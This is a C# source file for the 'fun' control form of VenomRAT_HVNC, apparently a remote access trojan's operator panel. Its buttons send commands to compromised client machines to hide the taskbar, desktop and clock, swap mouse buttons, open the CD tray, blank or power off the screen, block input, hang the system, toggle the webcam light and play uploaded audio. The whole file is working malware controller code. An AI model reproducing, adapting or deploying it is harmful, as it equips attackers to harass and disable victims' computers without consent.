using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormFun : Form
    {
        public FormFun()
        {
            this.InitializeComponent();
        }

        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button5_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button6_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button8_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button7_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button10_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button9_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button18_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button17_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button11_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
            msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button15_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
            msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button12_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button14_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button13_Click(object sender, EventArgs e)
        {
        }

        private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate (object o)
            {
                Clients client = this.Client;
                if (client == null)
                {
                    return;
                }
                client.Disconnected();
            });
        }

        private void button19_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button16_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void button13_Click_1(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "(*.wav)|*.wav";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    byte[] asBytes = File.ReadAllBytes(openFileDialog.FileName);
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
                    msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
                else
                {
                    MessageBox.Show("Please choose a wav file.");
                }
            }
        }
    }
}
